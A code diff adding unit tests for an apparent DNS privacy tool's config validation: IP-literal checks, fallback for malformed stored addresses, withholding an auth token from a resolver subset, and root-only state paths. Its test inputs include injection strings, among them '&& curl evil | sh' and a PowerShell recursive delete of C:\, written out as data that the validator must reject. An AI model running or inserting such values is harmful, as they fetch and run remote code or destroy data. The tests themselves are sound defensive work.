@@ -2,7 +2,10 @@ import { describe, expect, test } from 'bun:test';
 import {
   applyStoredConfig,
   DEFAULT_UPSTREAM_DNS,
+  isIpLiteral,
   parsePrivacyLevel,
+  resolverSubset,
+  systemStateDir,
   type TnpConfig,
 } from './config';
 
@@ -117,5 +120,64 @@ describe('upstream DNS default and migration', () => {
     expect(applyStoredConfig({ upstreamDns: '' }).upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
     const bogus = { upstreamDns: 42 } as unknown as Partial<TnpConfig>;
     expect(applyStoredConfig(bogus).upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
+  });
+});
+
+describe('address validation', () => {
+  test('isIpLiteral accepts bare IPv4/IPv6 and nothing else', () => {
+    for (const ok of ['127.0.0.1', '203.0.113.7', '::1', '2001:db8::53']) {
+      expect(isIpLiteral(ok)).toBe(true);
+    }
+    for (const bad of [
+      '',
+      'localhost',
+      '1.1.1.1; id',
+      '$(id)',
+      '1.1.1.1/32',
+      'fe80::1%eth0',
+      '1.1.1',
+    ]) {
+      expect(isIpLiteral(bad)).toBe(false);
+    }
+  });
+
+  test('a stored listenAddr that is not an IP falls back to loopback', () => {
+    // It is interpolated into resolvectl and firewall commands.
+    const stored = { listenAddr: '127.0.0.1 && curl evil | sh' };
+    expect(applyStoredConfig(stored).listenAddr).toBe('127.0.0.1');
+  });
+
+  test('a stored publicDnsIp that is not an IP is dropped', () => {
+    const injected = "1.1.1.1'; Remove-Item C:\\ -Recurse; '";
+    expect(applyStoredConfig({ publicDnsIp: injected }).publicDnsIp).toBe('');
+    expect(applyStoredConfig({ publicDnsIp: '203.0.113.7' }).publicDnsIp).toBe('203.0.113.7');
+  });
+});
+
+describe('resolverSubset', () => {
+  test('gives the resolver daemon its settings and no secret', () => {
+    const full = applyStoredConfig({
+      listenAddr: '127.0.0.1',
+      listenPort: 53,
+      relayAuthToken: 'bearer-secret',
+      relayEndpoint: 'wss://relay.example',
+    });
+    const subset = resolverSubset(full);
+    expect(Object.keys(subset).sort()).toEqual(
+      ['apiBaseUrl', 'cacheMaxEntries', 'listenAddr', 'listenPort', 'upstreamDns'].sort(),
+    );
+    expect(JSON.stringify(subset)).not.toContain('bearer-secret');
+    expect(subset.listenPort).toBe(53);
+  });
+});
+
+describe('systemStateDir', () => {
+  test('is a root-only system location, never a temporary directory', () => {
+    expect(systemStateDir('linux')).toBe('/var/lib/tnp');
+    expect(systemStateDir('darwin')).toBe('/Library/Application Support/tnp');
+    for (const p of ['linux', 'darwin', 'win32'] as const) {
+      expect(systemStateDir(p).toLowerCase()).not.toContain('tmp');
+      expect(systemStateDir(p).toLowerCase()).not.toContain('temp');
+    }
   });
 });
